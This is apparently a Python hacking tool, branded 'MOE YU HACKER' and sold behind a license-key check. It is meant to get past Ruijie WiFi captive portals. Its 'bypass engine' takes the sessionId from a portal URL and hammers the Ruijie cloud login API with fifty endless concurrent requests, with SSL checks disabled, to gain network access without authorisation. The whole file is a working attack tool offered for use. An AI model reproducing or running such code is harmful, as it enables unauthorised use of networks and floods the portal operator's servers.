import asyncio
import aiohttp
import requests
import urllib3
import os
import sys
import uuid
import random
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align

# SSL warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# ===============================
# CONFIG & LOGO
# ===============================
DB_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

GREETING_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [bold yellow] <( မင်္ဂလာပါ )[/bold yellow]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

# ===============================
# SECURITY SYSTEM
# ===============================
def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    if os.path.exists(id_file):
        with open(id_file, "r") as f: return f.read().strip()
    new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
    with open(id_file, "w") as f: f.write(new_id)
    return new_id

def check_license():
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(GREETING_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="cyan", expand=False)))
    
    try:
        user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
        if not user_key: sys.exit()
        
        res = requests.get(DB_URL, timeout=10)
        for line in res.text.splitlines():
            parts = line.split("|")
            if user_key == parts[0].strip():
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    console.print("[bold red]\n❌ HWID MISMATCH![/bold red]")
                    sys.exit()
                console.print("[bold green]\n✅ ACCESS GRANTED![/bold green]")
                return True
        console.print("[bold red]\n❌ INVALID KEY![/bold red]")
        sys.exit()
    except:
        console.print("[bold red]\n📡 CONNECTION ERROR![/bold red]")
        sys.exit()

# ===============================
# STAR BYPASS ENGINE (AIOHTTP)
# ===============================
async def send_pulse(session, url):
    """Asynchronous Request ပို့ခြင်း - သမရိုးကျထက် ပိုမြန်သည်"""
    while True:
        try:
            async with session.get(url, timeout=5) as response:
                sys.stdout.write(f"\033[92m[✓] BYPASS ACTIVE | STATUS: {response.status}\033[0m\r")
                sys.stdout.flush()
        except:
            pass
        await asyncio.sleep(0.05) # Pulse rate (0.05s)

async def start_bypass(portal_url):
    parsed = urlparse(portal_url)
    params = parse_qs(parsed.query)
    sid = params.get('sessionId', [None])[0]
    res_val = params.get('RES', [''])[0]
    
    if not sid:
        console.print("[bold red][-] sessionId မတွေ့ပါ။ Link ကို Browser မှ အသစ်ကူးယူပါ။[/bold red]")
        return

    # Ruijie Cloud v2 API Path
    auth_url = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/login?sessionId={sid}&res={res_val}"
    
    console.print(f"\n[bold green][+] Connected Session: {sid[:12]}[/bold green]")
    console.print("[bold yellow][*] STAR Engine စတင်နေပြီ...[/bold yellow]\n")

    # TCP Connector ကိုသုံးပြီး SSL check ပိတ်ကာ request ပိုမြန်အောင်လုပ်ခြင်း
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        tasks = []
        # တစ်ပြိုင်နက်တည်း Request ၅၀ ပို့မည်
        for _ in range(50):
            tasks.append(asyncio.create_task(send_pulse(session, auth_url)))
        
        await asyncio.gather(*tasks)

def main():
    if check_license():
        console.print("\n[1] Auto Detect (Standard)")
        console.print("[2] Manual Portal Link (Recommended)")
        mode = input("\nSelect Mode [1/2]: ").strip()

        if mode == "2":
            link = input("\nPaste Portal URL here: ").strip()
            if link:
                asyncio.run(start_bypass(link))
        else:
            # Auto Detection Logic
            try:
                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
                if r.status_code != 204:
                    asyncio.run(start_bypass(r.url))
                else:
                    console.print("[bold cyan][!] Internet ရနေပြီဖြစ်သောကြောင့် Bypass လုပ်ရန်မလိုပါ။[/bold cyan]")
            except:
                console.print("[bold red][!] Portal ကို ရှာမတွေ့ပါ။ WiFi ပြန်ချိတ်ပါ။[/bold red]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
